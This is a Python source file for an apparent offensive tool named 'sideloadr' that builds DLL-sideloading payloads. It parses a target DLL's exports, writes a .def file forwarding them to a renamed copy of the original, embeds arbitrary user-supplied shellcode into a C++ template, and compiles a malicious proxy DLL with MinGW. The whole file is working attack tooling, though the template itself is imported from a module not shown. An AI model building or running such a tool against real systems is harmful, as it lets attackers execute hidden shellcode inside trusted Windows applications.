#!/usr/bin/env python3

# Stdlib 
import argparse
import shutil
import os
import subprocess

# Third party
import pefile
import jinja2

# Lib
from sideloadr.constants import *

def get_module(dll):
    if ".dll" not in dll.lower():
        return ""
    return dll.split("/")[-1].split(".")[0]

def build_def(pe, victim_dll, new_name="tmp.dll", outdir="out"):
    # a variation of the code found on https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html
    module = get_module(victim_dll)
    new_module = get_module(new_name)
    with open(f"{outdir}/{module}.def", "w") as fp:
        fp.write("EXPORTS\n")
        for export in pe.DIRECTORY_ENTRY_EXPORT.symbols: 
            fp.write(
                f"{export.name.decode('UTF-8')}={new_module}.{export.name.decode('UTF-8')} @{export.ordinal}\n"
            )

def build_payload(victim_dll, payload, outdir="out"):
    module = get_module(victim_dll)

    env = jinja2.Environment()
    template = env.from_string(evildll)

    # Read in payload
    with open(payload, "rb") as fp:
        data = fp.read()
    
    # Reformat into hex
    pay = ""
    for b in data:
        pay += f"\\x{hex(b)[2:].rjust(2,'0')}"
    
    rendered = template.render(payload=pay)

    # write out to file
    with open(f"{outdir}/{module}.cpp", "w") as fp:
        fp.write(rendered)

def compile_payload(victim_dll, new_name, outdir="out", x86=False):
    """
    Compile the DLL to be used. 
    """
    module = get_module(victim_dll)
    new_module = get_module(new_name)

    # Copy orig dll
    shutil.copy(victim_dll, f"{outdir}/{new_module}.dll")

    # Run compiler
    if x86:
        command = f"i686-w64-mingw32-g++ -shared -s -o {outdir}/{module}.dll {outdir}/{module}.cpp {outdir}/{module}.def"
    else:
        command = f"x86_64-w64-mingw32-g++ -shared -s -o {outdir}/{module}.dll {outdir}/{module}.cpp {outdir}/{module}.def"
    
    pid = subprocess.Popen(command.split())
    pid.wait()

def clean_build_files(victim_dll, out_dir, CLEAN=True):
    module = get_module(victim_dll)
    if CLEAN:
        os.remove(f"{out_dir}/{module}.cpp")
        os.remove(f"{out_dir}/{module}.def")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("victim", help="Path to the DLL we want to impersonate.")
    parser.add_argument("payload", help="Path to the shellcode we want to execute.")
    parser.add_argument("proxy", help="What we want to rename the victim DLL to for proxying.", default="tmp.dll")
    parser.add_argument("outdir", help="The output directory for all artifacts.")
    parser.add_argument("--no-clean", help="Do not clean the build folder. Keep cpp and def file.", action='store_false')
    parser.add_argument("--x86", help="Set when you want to compile 32-bit instead of the default 64-bit.", action='store_true')
    args = parser.parse_args()

    # Parse and fix args
    victim = args.victim
    payload = args.payload
    new_name = args.proxy
    out_dir = args.outdir
    no_clean = args.no_clean
    x86 = args.x86

    victim = os.path.abspath(victim)
    new_name = new_name
    payload = os.path.abspath(payload)
    out_dir = os.path.abspath(out_dir)

    # Setup workfolder
    shutil.rmtree(f"{out_dir}", ignore_errors=True)
    os.makedirs(f"{out_dir}", exist_ok=True)

    # Process victim DLL
    pe = pefile.PE(victim)
    
    build_def(pe, victim, new_name, out_dir)
    build_payload(victim, payload, out_dir)
    compile_payload(victim, new_name, out_dir, x86=x86)
    clean_build_files(victim, out_dir, CLEAN=no_clean)

if __name__== "__main__":
    main()
